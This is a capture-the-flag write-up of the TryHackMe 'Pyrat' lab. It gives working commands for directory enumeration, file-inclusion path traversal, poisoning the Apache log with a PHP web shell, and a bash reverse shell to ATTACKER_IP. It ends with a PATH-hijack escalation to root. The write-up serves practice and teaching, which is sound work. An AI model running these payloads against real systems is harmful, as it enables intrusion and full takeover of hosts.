---

title: "Write-Up: THM - Pyrat"

pubDate: "2025-05-19"

description: "Solving the 'Pyrat' challenge from TryHackMe using LFI, log poisoning, and privilege escalation."

tags: ["tryhackme", "writeup", "lfi", "log-poisoning", "reverse-shell", "linux", "ctf"]

author: "IQ"

---


> 💀 **Difficulty:** Medium  

> 🧠 **Category:** CTF / Linux  

> 🛠️ **Tools:** `curl`, `nc`, `python3`, `bash`, `gobuster`, `Burp`, `linpeas`


---


## 🧭 1. Enumeration


Ran a quick directory brute-force with gobuster:


```bash

gobuster dir -u http://10.10.x.x:8000 -w /usr/share/wordlists/dirb/common.txt

```


Discovered paths like `/admin` and dynamic PHP loading via:


```

http://10.10.x.x:8000/index.php?page=contact

```


Tested for LFI:


```

?page=../../../../../../etc/passwd

```


✅ LFI confirmed.


---


## 📓 2. Log Poisoning + LFI = RCE


Target was vulnerable to reading Apache access logs. Injected a payload via User-Agent:


```bash

curl -A '<?php system($_GET["cmd"]); ?>' http://10.10.x.x:8000/

```


Then triggered it via:


```

http://10.10.x.x:8000/index.php?page=/var/log/apache2/access.log&cmd=whoami

```


Remote command execution achieved.


---


## 🔥 3. Reverse Shell


Executed a reverse shell payload:


```

http://10.10.x.x:8000/index.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1'

```


Listener:


```bash

nc -lvnp 4444

```


Got a shell as web user.


---


## 🚀 4. Privilege Escalation


Checked sudo rights:


```bash

sudo -l

```


Found a script that runs with root privileges and uses a binary without full path. Classic PATH hijack:


```bash

echo '/bin/bash' > /tmp/cleaner

chmod +x /tmp/cleaner

export PATH=/tmp:$PATH

sudo /opt/scripts/run-cleanup.sh

```


Boom: `root` shell.


---


## 🧠 Takeaways


- LFI is often underestimated — check log files, config paths, and error messages.

- Poisoning logs for code injection is old-school but still deadly.

- Always check `sudo -l` and audit root-owned scripts.


---


**Flags:**


- ✅ User

- ✅ Root


---


💻 *Rooted with style. Another box down.*
